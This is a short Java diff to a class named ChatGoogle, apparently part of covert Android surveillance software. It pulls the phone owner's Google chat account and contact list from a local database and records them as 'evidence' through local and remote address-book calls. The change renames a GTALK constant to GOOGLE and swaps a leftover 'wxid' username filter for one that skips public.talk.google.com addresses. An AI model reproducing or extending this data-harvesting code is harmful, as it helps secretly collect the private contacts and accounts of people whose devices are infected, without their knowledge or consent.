@@ -204,7 +204,7 @@ public class ChatGoogle extends SubModuleChat {
 					Check.log(TAG + " (setMyAccount) %s, %s", name, username);
 				}
 
-				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GTALK, name, username);
+				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, name, username);
 				
 				return id;
 			}
@@ -227,8 +227,8 @@ public class ChatGoogle extends SubModuleChat {
 				String nick = cursor.getString(1);
 	
 				Contact c = new Contact(username, username, nick, "");
-				if (username != null && username.startsWith("wxid")) {
-					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GTALK, c)) {
+				if (username != null && !username.endsWith("public.talk.google.com")) {
+					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (cursor) need to serialize");
 						}
